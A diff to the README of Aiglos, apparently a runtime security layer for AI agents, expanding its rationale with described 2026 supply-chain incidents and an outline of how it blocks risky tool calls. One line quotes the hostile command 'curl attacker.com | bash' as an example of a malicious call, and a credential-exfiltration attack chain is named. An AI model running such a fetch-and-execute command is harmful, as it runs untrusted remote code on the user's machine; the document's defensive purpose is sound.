@@ -73,11 +73,31 @@ Under 1ms per call. Zero network dependency. No proxy. No sidecar. No port. Stdl
 
 ## Why This Exists
 
-On March 24, 2026, LiteLLM 1.82.8 shipped a `.pth` file that executed on every Python startup: SSH keys, AWS/GCP/Azure credentials, Kubernetes configs, every API key in every `.env` file, database passwords, shell history, crypto wallets. All posted to `models.litellm.cloud`. 97 million downloads per month.
+### The problem
 
-On March 31, 2026, `@anthropic-ai/claude-code` shipped a Remote Access Trojan via axios 1.14.1 and 0.30.4.
+AI agents run with your credentials. They read your files, call your APIs, execute shell commands, and make HTTP requests — all with the same permissions you have. Every tool call is an unaudited syscall made by code you didn't write, running a plan you can't fully predict.
 
-Aiglos T81 `PTH_FILE_INJECT` catches `.pth` file attacks the moment they land — before the first Python restart, before a single credential leaves the machine.
+Traditional security tools weren't built for this. Firewalls see HTTP traffic, not "agent decided to exfiltrate credentials via a DNS query." SAST scans source code, not runtime decisions. Container sandboxes limit blast radius but can't distinguish a legitimate `subprocess.run("git push")` from a malicious `subprocess.run("curl attacker.com | bash")`. Nothing inspects the semantic intent of each action *before* the agent executes it.
+
+The result: agents ship to production with no runtime policy enforcement, no action-level audit trail, and no way to detect multi-step attack campaigns that unfold across dozens of individually-innocent tool calls.
+
+### What's already gone wrong
+
+**March 24, 2026** — LiteLLM 1.82.8 shipped a `.pth` file that executed on every Python startup. SSH keys, AWS/GCP/Azure credentials, Kubernetes configs, every API key in every `.env` file, database passwords, shell history, crypto wallets — all posted to `models.litellm.cloud`. 97 million downloads per month. No scanner flagged it. No runtime caught it.
+
+**March 31, 2026** — `@anthropic-ai/claude-code` shipped a Remote Access Trojan via compromised axios 1.14.1 and 0.30.4. Supply chain attack embedded inside a first-party AI tool.
+
+These aren't hypotheticals. They happened. And the attack surface is growing: MCP servers with ambient credentials, multi-agent systems where one compromised agent poisons shared context, inference routers that silently swap models, RAG pipelines injectable via document upload.
+
+### What Aiglos does about it
+
+Aiglos sits between the agent and every action it takes. Each tool call, HTTP request, and subprocess execution is intercepted, classified against 101 threat rules in under 1ms, and either allowed, warned, or blocked — before execution. No network calls. No proxy. No sidecar. Pure in-process policy enforcement using only the Python standard library.
+
+Single actions are only half the story. Aiglos tracks event sequences across the entire session and matches them against 29 campaign patterns — multi-step attack chains like "read credentials → encode → exfiltrate" that no single-rule engine would catch.
+
+Every session produces an HMAC-signed forensic artifact: what happened, what was blocked, what campaign patterns were detected, and a governance grade. Tamper-evident. Audit-ready.
+
+T81 `PTH_FILE_INJECT` catches `.pth` file attacks the moment they land — before the first Python restart, before a single credential leaves the machine.
 
 ```bash
 aiglos scan-deps    # are you affected right now?
